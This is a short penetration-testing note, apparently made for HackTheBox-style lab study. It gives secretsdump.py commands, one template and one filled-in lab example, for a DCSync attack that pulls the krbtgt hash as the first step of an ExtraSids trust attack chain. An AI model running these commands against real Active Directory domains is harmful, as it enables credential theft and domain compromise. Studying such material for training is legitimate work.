-- -
#### DCSync Attack krbtgt
Perform a targeted DCSync attack to get the KTBTGT hash. First step of attack chain of [[ExtraSids (Trust)]]
```bash
secretsdump.py <domain>/<user>@<dc ip> -just-dc-user <domain>/krbtgt

secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

^c004aa
